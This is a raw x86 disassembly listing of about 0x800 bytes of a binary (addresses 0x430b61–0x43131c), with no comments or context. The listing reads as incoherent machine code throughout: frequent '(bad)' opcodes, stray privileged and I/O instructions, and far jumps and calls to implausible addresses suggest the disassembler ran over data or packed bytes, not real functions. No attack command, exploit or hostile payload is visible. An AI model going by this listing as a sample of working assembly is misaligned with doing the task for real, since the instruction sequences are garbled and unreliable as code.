  430b61:	into   
  430b62:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430b69:	test   al,0x4d
  430b6b:	push   ebp
  430b6c:	jbe    0x430ba1
  430b6e:	mov    esi,DWORD PTR [ebx]
  430b70:	mov    al,0x3
  430b72:	push   ebp
  430b73:	add    esi,DWORD PTR [ebx]
  430b75:	rdpmc  
  430b77:	retf   0x5503
  430b7a:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b80:	dec    ebp
  430b81:	stc    
  430b82:	mov    ecx,DWORD PTR [eax]
  430b84:	or     BYTE PTR [ebp+0x4d],cl
  430b87:	jmp    0x1370c17
  430b8c:	dec    ebp
  430b8d:	dec    ebp
  430b8e:	(bad)  
  430b8f:	mov    esp,esp
  430b91:	clc    
  430b92:	test   ebx,ecx
  430b94:	clc    
  430b95:	ror    DWORD PTR [ebp-0x2a],cl
  430b98:	mov    esi,ecx
  430b9a:	lock scas eax,DWORD PTR es:[edi]
  430b9c:	inc    ebp
  430b9d:	mov    esi,DWORD PTR [ebx]
  430b9f:	hlt    
  430ba0:	pushf  
  430ba1:	jge    0x430b2e
  430ba3:	sub    esp,esp
  430ba5:	cmp    ecx,ebx
  430ba7:	ja     0x430b77
  430ba9:	mov    ebp,DWORD PTR [eax-0x58]
  430bac:	dec    ebp
  430bad:	xor    ecx,DWORD PTR [di+0x3]
  430bb1:	mov    ebp,eax
  430bb3:	clc    
  430bb4:	push   ebp
  430bb5:	retf   
  430bb6:	mov    dl,bl
  430bb8:	adc    esi,edx
  430bba:	jb     0x430b8a
  430bbc:	add    BYTE PTR [edi-0xb7474b3],ch
  430bc2:	lock jge 0x430b90
  430bc5:	sub    ecx,DWORD PTR [ebp+0x3b]
  430bc8:	mov    esi,DWORD PTR [edi-0x28]
  430bcb:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430bd2:	mov    BYTE PTR [ebx-0x34b20729],cl
  430bd8:	mov    edx,ebx
  430bda:	lock (bad) 
  430bdc:	ror    esi,cl
  430bde:	push   ebp
  430bdf:	scas   eax,DWORD PTR es:[edi]
  430be0:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430be6:	fwait
  430be7:	sub    esi,DWORD PTR [edx]
  430be9:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430bf0:	xor    esp,DWORD PTR [ebx]
  430bf2:	add    ecx,DWORD PTR [ebp-0x18]
  430bf5:	mov    edi,DWORD PTR [ebp-0x8]
  430bf8:	mov    bl,cl
  430bfa:	cmp    dl,bl
  430bfc:	jb     0x430bcc
  430bfe:	add    dh,dl
  430c00:	dec    ebp
  430c01:	scas   eax,DWORD PTR es:[edi]
  430c02:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430c08:	shr    DWORD PTR [ebx],cl
  430c0a:	into   
  430c0b:	cmp    edx,esi
  430c0d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430c13:	dec    ebp
  430c14:	dec    ebp
  430c15:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430c1b:	retf   
  430c1c:	xor    edx,esi
  430c1e:	add    ecx,esi
  430c20:	imul   ecx,edx
  430c23:	mov    DWORD PTR [ebp+0x8],edx
  430c26:	xor    ecx,DWORD PTR [ebp+0x2b]
  430c29:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430c2f:	add    esi,DWORD PTR [ebx]
  430c31:	rol    BYTE PTR [ebx],0x45
  430c34:	rdtsc  
  430c36:	xlat   BYTE PTR ds:[ebx]
  430c37:	pushf  
  430c38:	jge    0x430bc3
  430c3a:	xor    ebx,eax
  430c3c:	sub    eax,DWORD PTR [ebp-0x73]
  430c3f:	(bad)  
  430c40:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430c47:	dec    ebp
  430c48:	xchg   BYTE PTR [ebx],dh
  430c4a:	inc    DWORD PTR [ebx]
  430c4c:	(bad)  
  430c4d:	jmp    0x430c9c
  430c4f:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430c55:	dec    ebp
  430c56:	into   
  430c57:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430c5d:	fwait
  430c5e:	shl    DWORD PTR [edx],cl
  430c60:	retf   0x5588
  430c63:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430c69:	add    eax,DWORD PTR [eax]
  430c6b:	call   0x8ace61bd
  430c70:	fcom   QWORD PTR [ecx]
  430c72:	retf   
  430c73:	jb     0x430cda
  430c75:	add    ch,cl
  430c77:	dec    ebp
  430c78:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430c7e:	dec    ebp
  430c7f:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c85:	jge    0x430c55
  430c87:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c8d:	add    cl,dh
  430c8f:	dec    ebp
  430c90:	dec    DWORD PTR [ebx-0x2c031b01]
  430c96:	inc    ebp
  430c97:	push   ebp
  430c98:	dec    DWORD PTR [ebx-0x73ff2734]
  430c9e:	lea    ebx,[ebx-0x7400cdac]
  430ca4:	push   eax
  430ca5:	mov    ah,0x45
  430ca7:	push   ebp
  430ca8:	mov    esi,DWORD PTR [ebx]
  430caa:	les    esi,FWORD PTR [ebx]
  430cac:	add    BYTE PTR [ebx],al
  430cae:	inc    DWORD PTR [ebx]
  430cb0:	mov    ecx,DWORD PTR [edi]
  430cb2:	cld    
  430cb3:	retf   0x4d80
  430cb6:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430cbc:	jne    0x430c49
  430cbe:	jmp    eax
  430cc0:	ror    bl,1
  430cc2:	or     cl,dh
  430cc4:	add    BYTE PTR [edi-0xf2f7475],ch
  430cca:	not    bl
  430ccc:	adc    al,0xca
  430cce:	inc    ebp
  430ccf:	push   ebp
  430cd0:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430cd6:	push   0xaf80d6
  430cdb:	mov    eax,DWORD PTR [eax]
  430cdd:	in     al,0xff
  430cdf:	sti    
  430ce0:	sbb    dh,cl
  430ce2:	pop    esi
  430ce3:	xchg   esp,eax
  430ce4:	leave  
  430ce5:	fwait
  430ce6:	add    al,0x32
  430ce8:	push   ebp
  430ce9:	cmp    ebp,esp
  430ceb:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430cef:	dec    DWORD PTR [ecx-0x740f0375]
  430cf5:	push   ebp
  430cf6:	cld    
  430cf7:	xor    ebp,ebx
  430cf9:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430cff:	push   ebp
  430d00:	clc    
  430d01:	xor    esi,ecx
  430d03:	add    esi,DWORD PTR [ebp-0x75]
  430d06:	(bad)  
  430d07:	hlt    
  430d08:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430d0f:	mov    DWORD PTR [esi],eax
  430d11:	hlt    
  430d12:	(bad)  
  430d13:	dec    ebp
  430d14:	add    esi,DWORD PTR [ebx]
  430d16:	(bad)  
  430d17:	mov    edx,0xffc68d0a
  430d1c:	add    dl,cl
  430d1e:	leave  
  430d1f:	push   ebp
  430d20:	push   ebp
  430d21:	mov    ebp,esp
  430d23:	fcom   QWORD PTR [ecx+0x7d]
  430d26:	inc    ebp
  430d27:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430d2d:	iret   
  430d2e:	cld    
  430d2f:	retf   0x868f
  430d32:	loopne 0x430d31
  430d34:	mov    edi,edi
  430d36:	mov    esi,DWORD PTR [ebp-0x8]
  430d39:	mov    esi,eax
  430d3b:	cld    
  430d3c:	jne    0x430cee
  430d3e:	mov    BYTE PTR [ecx],0xa
  430d41:	add    dh,al
  430d43:	test   DWORD PTR [eax],ecx
  430d45:	inc    esi
  430d47:	inc    DWORD PTR [edi]
  430d49:	mov    eax,esi
  430d4b:	cld    
  430d4c:	add    DWORD PTR [eax+0x901c6],eax
  430d52:	leave  
  430d53:	xor    BYTE PTR [ebp+0x45],dl
  430d56:	in     al,dx
  430d57:	mov    edx,DWORD PTR [ecx-0x40]
  430d5a:	inc    ebp
  430d5b:	add    BYTE PTR [ecx-0x74000301],cl
  430d61:	int3   
  430d62:	cld    
  430d63:	jne    0x430d1d
  430d65:	call   0xcc2070
  430d6a:	mov    esi,DWORD PTR [ebp-0x8]
  430d6d:	test   eax,esi
  430d6f:	je     0x430de6
  430d71:	mov    eax,esi
  430d73:	cld    
  430d74:	add    al,0x80
  430d76:	add    WORD PTR [ecx+0x0],ax
  430d7a:	fiadd  DWORD PTR [eax]
  430d7c:	mov    BYTE PTR [eax],0x3d
  430d7f:	push   0xffffffc3
  430d81:	push   esi
  430d82:	mov    edx,DWORD PTR [eax+0x51]
  430d85:	pop    edi
  430d86:	lea    ebx,[ebx-0x8]
  430d89:	ret    0x45
  430d8c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d92:	xchg   eax,edi
  430d94:	mov    DWORD PTR [ebp-0x75],ecx
  430d97:	push   esi
  430d98:	clc    
  430d99:	jne    0x430d6b
  430d9b:	mov    ecx,0xf8450b0b
  430da0:	(bad)  
  430da1:	push   cs
  430da2:	or     BYTE PTR [ebp-0x3a],dh
  430da5:	cmp    eax,DWORD PTR [ecx]
  430da7:	pop    esi
  430da8:	(bad)  
  430da9:	or     al,0x5
  430dab:	inc    eax
  430dac:	leave  
  430dad:	jmp    0x40cf:0x25564204
  430db4:	leave  
  430db5:	in     eax,dx
  430db6:	inc    DWORD PTR [eax-0x75]
  430db9:	fimul  DWORD PTR [ebx-0x228139be]
  430dbf:	inc    eax
  430dc0:	nop
  430dc1:	loopne 0x430dc2
  430dc3:	ret    
  430dc4:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430dca:	add    eax,0xff45e8f8
  430dcf:	push   esi
  430dd0:	push   DWORD PTR [ebp-0x39]
  430dd3:	mov    eax,0x7edda46
  430dd8:	or     al,0x6
  430dda:	push   DWORD PTR [ebp-0x3a]
  430ddd:	cmp    eax,DWORD PTR [edx]
  430ddf:	pop    esi
  430de0:	ret    
  430de1:	or     al,0x56
  430de3:	inc    ecx
  430de4:	push   ebp
  430de5:	jle    0x430dd3
  430de7:	inc    edx
  430de8:	inc    ebp
  430de9:	int    0x1
  430deb:	inc    ecx
  430dec:	sub    BYTE PTR ds:0xe77541fc,ah
  430df2:	add    DWORD PTR [edx+0x1c],eax
  430df5:	retf   0xc38b
  430df8:	adc    al,0x8b
  430dfa:	xchg   edx,eax
  430dfb:	push   ecx
  430dfc:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430e02:	rcl    DWORD PTR [esi-0x9],cl
  430e05:	jne    0x430e57
  430e07:	mov    eax,0x7c80ece
  430e0c:	rol    DWORD PTR [esi],cl
  430e0e:	div    DWORD PTR [ebp+0x50]
  430e11:	cmp    ecx,edx
  430e13:	pop    esi
  430e14:	dec    BYTE PTR [edx]
  430e16:	in     al,dx
  430e17:	inc    edx
  430e18:	sub    esp,ecx
  430e1a:	inc    eax
  430e1b:	(bad)  
  430e1c:	push   eax
  430e1d:	add    edx,DWORD PTR [eax-0x1f]
  430e20:	push   edi
  430e21:	add    dh,dh
  430e23:	leave  
  430e24:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430e28:	add    BYTE PTR [ecx+0x0],dl
  430e2b:	inc    ebp
  430e2c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430e32:	add    BYTE PTR [eax-0x7fbf448],bh
  430e38:	add    al,0x2
  430e3a:	jmp    0x57eb994
  430e3f:	jne    0x430e29
  430e41:	mov    eax,DWORD PTR [edx]
  430e43:	or     BYTE PTR [eax],al
  430e45:	inc    ecx
  430e46:	stc    
  430e47:	in     eax,dx
  430e48:	ss inc eax
  430e4a:	aas    
  430e4b:	out    0x7d,eax
  430e4d:	inc    ecx
  430e4e:	mov    ebp,ecx
  430e50:	lock ret 0x7d
  430e54:	and    ecx,DWORD PTR [ebx-0x171777]
  430e5a:	add    bh,bh
  430e5c:	aad    0xd7
  430e5e:	add    dh,cl
  430e60:	clts   
  430e62:	(bad)  
  430e63:	call   0xffce0d68
  430e68:	hlt    
  430e69:	iret   
  430e6a:	jge    0x430e42
  430e6c:	rol    DWORD PTR [esi-0x80],cl
  430e6f:	jmp    0x1c5d7c
  430e74:	out    dx,al
  430e75:	mov    eax,DWORD PTR [ebx]
  430e77:	(bad)  
  430e78:	pop    esi
  430e79:	push   es
  430e7a:	cmp    al,0xe8
  430e7c:	sar    edi,0x8
  430e7f:	inc    DWORD PTR [edi]
  430e81:	inc    esi
  430e82:	(bad)  
  430e83:	loopne 0x430f03
  430e85:	push   edi
  430e86:	push   cs
  430e87:	push   ebx
  430e88:	add    BYTE PTR [ebx+0x24008b56],cl
  430e8e:	add    BYTE PTR [ebp+0x50],al
  430e91:	push   eax
  430e92:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e98:	sub    edx,DWORD PTR [esi-0x24]
  430e9b:	jne    0x430e53
  430e9d:	lods   eax,DWORD PTR ds:[esi]
  430e9e:	mov    edx,DWORD PTR [edx-0x34]
  430ea1:	dec    esi
  430ea2:	out    0x83,eax
  430ea4:	into   
  430ea5:	push   edi
  430ea7:	loopne 0x430e77
  430ea9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430ead:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430eb4:	rol    DWORD PTR [edx],0x8
  430eb7:	mov    esp,ecx
  430eb9:	cmp    DWORD PTR [ebx],0xc
  430ebc:	mov    esi,0x5001c0
  430ec1:	push   eax
  430ec2:	push   cs
  430ec3:	push   eax
  430ec4:	(bad)  
  430ec5:	sub    edx,edi
  430ec7:	push   esi
  430ec8:	adc    al,0xcb
  430eca:	ins    DWORD PTR es:[edi],dx
  430ecb:	mov    eax,0x203e8
  430ed0:	add    al,ah
  430ed2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430ed9:	add    dh,al
  430edb:	add    ah,ch
  430edd:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430ee3:	pop    ecx
  430ee4:	or     eax,ebx
  430ee6:	cli    
  430ee7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430eed:	lea    ebp,[ebx]
  430eef:	mov    edx,DWORD PTR [edx-0x4]
  430ef2:	dec    ecx
  430ef3:	inc    ebp
  430ef4:	shr    BYTE PTR [ebx],0x4b
  430ef7:	and    al,0x0
  430ef9:	(bad)  
  430efa:	jne    0x430f41
  430efc:	pop    eax
  430efd:	mov    al,0x5a
  430eff:	call   0x142115e
  430f04:	and    al,0x85
  430f06:	push   edx
  430f07:	add    BYTE PTR [eax+eax*1+0x0],ah
  430f0b:	dec    ebp
  430f0c:	mov    cl,0x23
  430f0e:	jmp    0x430efc
  430f10:	mov    al,0xe7
  430f12:	call   0x1391200
  430f17:	shr    DWORD PTR [eax+ebx*2],cl
  430f1a:	lock (bad) 
  430f1c:	adc    eax,0x757f008d
  430f21:	out    0x58,eax
  430f23:	cmp    al,0x7
  430f25:	pop    edx
  430f26:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430f2d:	push   ecx
  430f2e:	cld    
  430f2f:	mov    esi,0x3b0175
  430f34:	and    al,0xb0
  430f36:	xor    BYTE PTR [edx+0x1],0x8b
  430f3a:	add    ah,bh
  430f3c:	mov    edi,DWORD PTR [ebp-0x4]
  430f3f:	psubsw mm7,QWORD PTR [edi]
  430f42:	add    DWORD PTR [ebp+0x0],ebp
  430f45:	rcr    eax,1
  430f47:	mov    edi,ecx
  430f49:	and    eax,DWORD PTR [eax]
  430f4b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430f51:	call   0x130123a
  430f56:	add    al,cl
  430f58:	mov    ebp,esi
  430f5a:	aam    0x83
  430f5c:	or     DWORD PTR [ecx],eax
  430f5e:	jne    0x430f51
  430f60:	mov    eax,DWORD PTR [eax]
  430f62:	aam    0x0
  430f64:	dec    ebp
  430f65:	jne    0x430ef2
  430f67:	cmp    ebx,eax
  430f69:	jb     0x430fb8
  430f6b:	jmp    0x430ef8
  430f6d:	mov    ebx,esp
  430f6f:	int3   
  430f70:	dec    ebp
  430f71:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f78:	mov    edx,0x8b0a8b
  430f7d:	cmp    ecx,DWORD PTR [eax]
  430f7f:	jb     0x430f58
  430f81:	pop    edx
  430f82:	push   edi
  430f83:	cli    
  430f84:	pop    es
  430f85:	mov    eax,ecx
  430f87:	jb     0x430f8b
  430f89:	add    DWORD PTR [ebx],0xa
  430f8c:	mov    eax,DWORD PTR [ebx]
  430f8e:	int3   
  430f8f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f95:	jmp    0x430f22
  430f97:	mov    al,0xe8
  430f99:	call   0x104121b
  430f9e:	add    edx,DWORD PTR [ecx+ecx*8]
  430fa1:	pop    edi
  430fa2:	or     BYTE PTR [ecx-0x73],bl
  430fa5:	pop    ecx
  430fa6:	inc    edi
  430fa7:	xor    al,0xeb
  430fa9:	push   ecx
  430faa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430fb0:	call   0xb210b5
  430fb5:	int3   
  430fb6:	sbb    BYTE PTR [esi],ch
  430fb8:	inc    ebp
  430fb9:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430fbf:	call   0x9c122e
  430fc4:	or     BYTE PTR [ebx-0x73],dl
  430fc7:	cmp    al,0x47
  430fc9:	mov    al,0x1
  430fcb:	jb     0x430fcd
  430fcd:	mov    al,0x10
  430fcf:	push   eax
  430fd0:	add    al,0x75
  430fd2:	add    BYTE PTR [ebx],ch
  430fd4:	add    ebx,esp
  430fd6:	int3   
  430fd7:	jne    0x430fe9
  430fd9:	movsx  edx,cl
  430fdc:	add    DWORD PTR [eax],eax
  430fde:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430fe5:	mov    gs,edi
  430fe7:	add    BYTE PTR [eax-0x50],ch
  430fea:	add    al,ch
  430fec:	mov    eax,DWORD PTR [ecx]
  430fee:	sub    eax,DWORD PTR [eax]
  430ff0:	jb     0x431067
  430ff2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ff6:	jge    0x430fe0
  430ff8:	add    al,0x1
  430ffa:	add    DWORD PTR [eax],0x0
  430ffd:	jne    0x430fff
  430fff:	je     0x431046
  431001:	mov    eax,DWORD PTR [edi]
  431003:	ror    BYTE PTR [ebp+0x4d],1
  431006:	or     DWORD PTR [ecx+0x4d03d004],0x3
  43100d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431013:	mov    DWORD PTR [ebx],ebp
  431015:	fadd   DWORD PTR [eax+0x75]
  431018:	inc    eax
  431019:	pop    eax
  43101a:	lea    ebx,[ecx+0x4f]
  43101d:	push   0xb1000003
  431022:	out    dx,eax
  431023:	add    ebp,DWORD PTR [edx+edx*2]
  431026:	add    BYTE PTR [ebx+ecx*4],bh
  431029:	mov    ch,BYTE PTR [ebx]
  43102b:	jb     0x43109f
  43102d:	add    al,0x89
  43102f:	push   eax
  431030:	call   0x842b5da2
  431035:	add    DWORD PTR [eax+eax*1],eax
  431038:	jae    0x43104e
  43103a:	icebp  
  43103b:	inc    ebp
  43103c:	mov    eax,DWORD PTR gs:[ecx]
  43103f:	int3   
  431040:	out    dx,al
  431041:	loopne 0x431090
  431043:	sub    eax,DWORD PTR [edx]
  431045:	push   0xffffff83
  431047:	pop    esi
  431048:	push   cs
  431049:	jl     0x431064
  43104b:	add    al,0xaf
  43104d:	xor    eax,0x832b6d00
  431052:	mov    eax,DWORD PTR [edx]
  431054:	rcr    BYTE PTR [ebp+0x754500dc],cl
  43105a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431060:	inc    ebp
  431061:	shr    ebx,0x3
  431064:	or     DWORD PTR [eax],0x4
  431067:	push   0xffffffa5
  431069:	pop    esi
  43106a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431071:	jmp    0x4310d0
  431073:	mov    edi,0xff0272
  431078:	fdivr  QWORD PTR [ebp+0x5d]
  43107b:	push   0x4e
  43107d:	pop    ecx
  43107e:	call   0x435483
  431083:	mov    DWORD PTR [ebx],eax
  431085:	in     al,0xc8
  431087:	rol    BYTE PTR [ebp-0x75],0xc1
  43108b:	call   0xad126c
  431090:	pop    esi
  431091:	enter  0xceff,0x8b
  431095:	repz mov ecx,DWORD PTR [ebp-0x34]
  431099:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  4310a0:	je     0x4310a2
  4310a2:	or     DWORD PTR [ebx-0x74183b24],eax
  4310a8:	jne    0x43108e
  4310aa:	jmp    0x4310a5
  4310ac:	push   DWORD PTR [edx-0x24]
  4310af:	push   0x4d
  4310b1:	pop    ecx
  4310b2:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  4310b6:	jge    0x4310be
  4310b8:	mov    eax,eax
  4310ba:	sub    ebp,DWORD PTR [edx+0x24]
  4310bd:	pop    esi
  4310be:	inc    ebp
  4310bf:	mov    esp,0x8b6077
  4310c4:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4310ca:	lods   al,BYTE PTR ds:[esi]
  4310cb:	add    BYTE PTR [ebx],bh
  4310cd:	enter  0xce73,0x49
  4310d1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4310d9:	stc    
  4310da:	jge    0x43114e
  4310dc:	jnp    0xdd42944b
  4310e2:	call   0xc611b8
  4310e7:	fadd   st(0),st
  4310e9:	dec    esi
  4310ea:	ins    BYTE PTR es:[edi],dx
  4310eb:	stc    
  4310ec:	cmp    al,0x73
  4310ee:	push   ebp
  4310ef:	mov    eax,0xf8028b
  4310f4:	jne    0x4310b7
  4310f6:	mov    esi,ecx
  4310f8:	mov    esp,DWORD PTR [ebp+0x2c]
  4310fb:	add    edi,DWORD PTR [ebp-0x24]
  4310fe:	sub    esp,eax
  431100:	and    al,0x45
  431102:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431108:	sbb    al,0xee
  43110a:	pop    esi
  43110b:	call   0x83113b
  431110:	fsubr  st,st(3)
  431112:	sti    
  431113:	add    BYTE PTR gs:[ecx],bh
  431116:	add    eax,esp
  431118:	add    DWORD PTR [esi],eax
  43111a:	rol    DWORD PTR [ebp+0x8],0x29
  43111e:	mov    esp,eax
  431120:	clc    
  431121:	jne    0x431198
  431123:	mov    eax,0x8b0673
  431128:	loopne 0x43116f
  43112a:	loopne 0x4310b5
  43112c:	lods   al,BYTE PTR ds:[esi]
  43112d:	int3   
  43112e:	inc    ebp
  43112f:	mov    DWORD PTR gs:[eax+edi*8],eax
  431133:	add    al,0xc3
  431135:	sub    ecx,DWORD PTR [ebp+0x47]
  431138:	(bad)  
  43113a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43113e:	add    eax,DWORD PTR [eax]
  431140:	call   0x644d245
  431145:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43114b:	dec    esi
  43114c:	ins    DWORD PTR es:[edi],dx
  43114d:	in     al,dx
  43114e:	lea    eax,[eax]
  431150:	inc    ebp
  431151:	inc    ebp
  431152:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431158:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431162:	and    al,0xdc
  431164:	ror    DWORD PTR [edx+0x24],0xf7
  431168:	or     BYTE PTR [ebp+0x4c],dh
  43116b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43116f:	stos   BYTE PTR es:[edi],al
  431170:	adc    edx,edi
  431172:	inc    esp
  431173:	add    edi,DWORD PTR [eax]
  431175:	jne    0x43115a
  431177:	mov    DWORD PTR [eax-0x7449db04],ecx
  43117d:	cmp    ecx,DWORD PTR [edi]
  43117f:	sub    BYTE PTR [ebp-0x7e],dl
  431182:	sar    ebp,0xb
  431185:	jmp    FWORD PTR [edi+0x2400392a]
  43118b:	sub    esi,DWORD PTR [ebx-0x73]
  43118e:	mov    esp,DWORD PTR [ecx+edi*4]
  431191:	mov    ecx,DWORD PTR [eax]
  431193:	and    BYTE PTR [eax],al
  431195:	jne    0x431161
  431197:	sub    ebp,ecx
  431199:	sbb    BYTE PTR [esi+0x32],ah
  43119c:	dec    ebp
  43119d:	push   ebp
  43119e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4311a4:	ret    
  4311a5:	mov    edx,ebp
  4311a7:	leave  
  4311a8:	sub    DWORD PTR [esi+0x24],ebx
  4311ab:	ret    0x2b
  4311ae:	pop    ax
  4311b0:	push   ebp
  4311b1:	rol    BYTE PTR [ebx],0xeb
  4311b4:	add    DWORD PTR [ecx+0x6c0001],0x40
  4311bb:	jb     0x431212
  4311bd:	ret    
  4311be:	in     al,dx
  4311bf:	jecxz  0x43114c
  4311c1:	push   esi
  4311c2:	xchg   esp,eax
  4311c3:	jne    0x4311c5
  4311c5:	cmp    edx,DWORD PTR [esi+0x1c]
  4311c8:	jne    0x4311ae
  4311ca:	mov    eax,DWORD PTR [ebp-0x77]
  4311cd:	ror    DWORD PTR [ebx+0x899408],0xe0
  4311d4:	mov    esi,DWORD PTR [ebp-0x75]
  4311d7:	pop    esi
  4311d8:	nop
  4311d9:	mov    eax,DWORD PTR [eax]
  4311db:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4311e1:	add    al,0x0
  4311e3:	inc    ebp
  4311e4:	mov    eax,DWORD PTR [ebx]
  4311e6:	mov    ebp,ebx
  4311e8:	cmp    al,0xf
  4311ea:	or     al,al
  4311ec:	inc    ebp
  4311ed:	inc    ebp
  4311ee:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  4311f4:	cld    
  4311f5:	add    BYTE PTR [edi+0x546c16c0],dh
  4311fb:	add    BYTE PTR [ecx-0x5],dl
  4311fe:	add    eax,0x17200
  431203:	sbb    al,0x85
  431205:	dec    esp
  431206:	je     0x431240
  431208:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43120c:	add    BYTE PTR [ebx],bh
  43120e:	(bad)  
  43120f:	and    al,0x32
  431211:	jae    0x4311af
  431213:	mov    cl,cl
  431215:	inc    DWORD PTR [esp]
  431218:	push   ebp
  431219:	shr    esp,0x8
  43121c:	in     al,dx
  43121d:	push   esp
  43121e:	add    DWORD PTR [eax],esp
  431220:	add    bl,cl
  431222:	inc    ebp
  431223:	mov    bh,0x89
  431225:	add    ah,bh
  431227:	jmp    0xca752171
  43122c:	pushf  
  43122d:	dec    esp
  43122e:	mov    edx,0xf8178520
  431233:	fst    DWORD PTR [ebp+0x0]
  431236:	mov    BYTE PTR [eax],0xc4
  431239:	sub    edx,DWORD PTR [ebx-0x3f]
  43123c:	inc    ebp
  43123d:	add    eax,0xc601da
  431242:	mov    al,0xc6
  431245:	ins    BYTE PTR es:[edi],dx
  431246:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  43124d:	dec    esp
  43124e:	jmp    DWORD PTR [eax]
  431250:	inc    ebp
  431251:	fnstcw WORD PTR [esi+0x29]
  431254:	test   BYTE PTR [eax],0xc8
  431257:	rol    BYTE PTR [eax],0xc0
  43125a:	lea    ecx,[ebp-0x3cf0dbcb]
  431260:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431266:	inc    esi
  431267:	add    DWORD PTR [eax],ebx
  431269:	add    dh,bh
  43126b:	mov    esi,DWORD PTR [edx+0x8]
  43126e:	(bad)  
  43126f:	fdiv   QWORD PTR ss:[ecx]
  431272:	(bad)  
  431273:	mov    bl,ch
  431275:	add    esi,eax
  431277:	add    dh,bl
  431279:	or     esi,eax
  43127b:	mov    dl,0xdf
  43127d:	add    esi,eax
  43127f:	add    al,ah
  431281:	push   cs
  431282:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431289:	or     BYTE PTR [ebx],dh
  43128b:	dec    ecx
  43128c:	lea    eax,[ebx]
  43128e:	xor    eax,0x18fc0fc7
  431293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431294:	repz clc 
  431296:	add    eax,DWORD PTR [ebp+0x46]
  431299:	prefetcht0 BYTE PTR [ecx-0x2]
  43129d:	xor    eax,0x7c60872
  4312a2:	mov    esp,0xbd32c69b
  4312a7:	pop    esi
  4312a8:	mov    cl,0xbe
  4312ab:	or     al,0xc6
  4312ad:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4312b4:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4312bb:	add    dh,al
  4312bd:	mov    eax,ebx
  4312bf:	xor    DWORD PTR [ebx],0x35008dbc
  4312c5:	mov    ecx,DWORD PTR [edi]
  4312c7:	sbb    al,0x18
  4312c9:	inc    ebp
  4312ca:	xrelease mov DWORD PTR [ebx],0x188546f4
  4312d1:	clc    
  4312d2:	(bad)  
  4312d3:	xor    DWORD PTR [edx-0x64],esi
  4312d6:	lea    ecx,[ecx+0x45ffe838]
  4312dc:	mov    ecx,ebx
  4312de:	fadd   st,st(6)
  4312e0:	dec    ebp
  4312e1:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4312e7:	out    0x1,eax
  4312e9:	inc    ebp
  4312ea:	lea    ebp,ds:0xc8ffc6ff
  4312f0:	enter  0xa33,0xc6
  4312f4:	push   ebp
  4312f5:	leave  
  4312f6:	(bad)  
  4312f7:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4312fd:	add    BYTE PTR [ebp+0x44],al
  431300:	mov    eax,esp
  431302:	mov    WORD PTR [esi+0x46398300],?
  431308:	psubusw mm4,QWORD PTR [esi-0x78]
  43130c:	add    BYTE PTR [ebx-0x1303f975],al
  431312:	add    BYTE PTR [ebp+0x1],0xeb
  431316:	add    BYTE PTR [ebp+0x38],al
  431319:	in     eax,dx
  43131a:	inc    ebp
  43131b:	inc    ebp
  43131c:	mov    ebx,ebx
